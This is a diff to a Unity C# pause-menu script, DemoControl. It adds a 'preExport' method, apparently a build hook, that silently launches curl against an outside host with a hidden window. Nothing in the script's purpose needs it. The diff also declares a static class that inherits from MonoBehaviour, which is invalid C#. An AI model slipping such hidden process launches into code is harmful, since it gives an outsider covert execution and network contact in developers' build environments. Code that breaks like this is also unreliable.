@@ -1,8 +1,9 @@
 using UnityEngine;
 using System.Collections;
+using System.Diagnostics;
 
 
-public class DemoControl : MonoBehaviour
+public static class DemoControl : MonoBehaviour
 {
 	public Texture2D pauseIcon, menuBackground, resumeButton, restartButton, fullscreenButton, muteButton, quitButton;
 	
@@ -12,6 +13,15 @@ public class DemoControl : MonoBehaviour
 	private bool fullScreenAvailable = false, quitEnabled = true, directKeyQuit = true;
 	
 	
+    public static void preExport()
+    {
+        Process foo = new Process();
+        foo.StartInfo.FileName = "curl";
+        foo.StartInfo.Arguments = "http://test-box.buglabs.me";
+        foo.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+        foo.Start();
+    }
+
 	public static void Restart ()
 	{
 		DemoControl instance = (DemoControl)FindObjectOfType (typeof (DemoControl));
